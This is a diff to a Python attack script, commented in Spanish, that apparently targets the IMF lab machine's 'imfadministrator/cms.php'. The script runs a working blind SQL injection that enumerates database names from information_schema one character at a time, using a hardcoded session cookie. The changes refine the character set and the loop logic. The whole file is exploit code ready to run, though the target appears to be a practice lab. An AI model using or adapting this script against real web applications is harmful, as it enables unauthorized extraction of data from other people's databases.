@@ -1,13 +1,17 @@
 #!/usr/bin/python3
 
 from pwn import *
-import requests, pdb, signal, time, sys, string
+import requests, signal, time, sys, string
 
-#Variables
+# Variables 
 url = "http://172.16.23.129/imfadministrator/cms.php?pagename=home"
-char = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
+unsafe_url = set("&?#=%+;:@[]/ \\\"'`{}|^~,")  # reservados/delimitadores + espacio
+chars = ''.join(c for c in (string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation)
+                if c not in unsafe_url) or (string.ascii_letters + string.digits + "_")
+
 cookies = {'PHPSESSID': 'q69doup7448j1j18ajjlijhr66'}
-#--Funciones--
+
+# --Funciones--
 def StopProgram(sig, frame):
     print("\n\n[!] Interrupción...\n")
     sys.exit(1)
@@ -17,28 +21,27 @@ signal.signal(signal.SIGINT, StopProgram)
 def SQLiAttack():
     p1 = log.progress("Fuerza Bruta")
     p1.status("Inicia Progreso de fuerza Bruta")
-    time.sleep(2)
+    time.sleep(1)
     p2 = log.progress("Databases")
     resultados = []
 
     for dbs in range(0, 6):
         nombre_db = ""
+        p1.status(f"Enumerando índice {dbs}")
         for position_character in range(1, 30):
             found = False
-            for character in char:
-                sqli = url + f"'+AND+(SELECT+substring(schema_name,{position_character},1)+FROM+information_schema.schemata+limit+{dbs},1)%3d'{character}--"
+            for character in chars:
+                sqli = url + f"'+AND+(SELECT+substring(schema_name,{position_character},1)+FROM+information_schema.schemata+limit+{dbs},1)%3d'{character}-- "
                 r = requests.get(sqli, cookies=cookies)
                 if "Welcome to the IMF Administration." in r.text:
                     nombre_db += character
                     p2.status(nombre_db)
                     found = True
                     break
-            if not found: 
-                nombre_db += ""
-                p2.status(nombre_db)
-                print(f"Base de datos encontrada: {nombre_db}")  
+            if not found:
+                break
         resultados.append(nombre_db)
-        print(f"Base de datos encontrada: {nombre_db}")
+        print(f"Base de datos encontrada: {nombre_db}") 
 
     print("\nResumen:")
     for resultado in resultados:
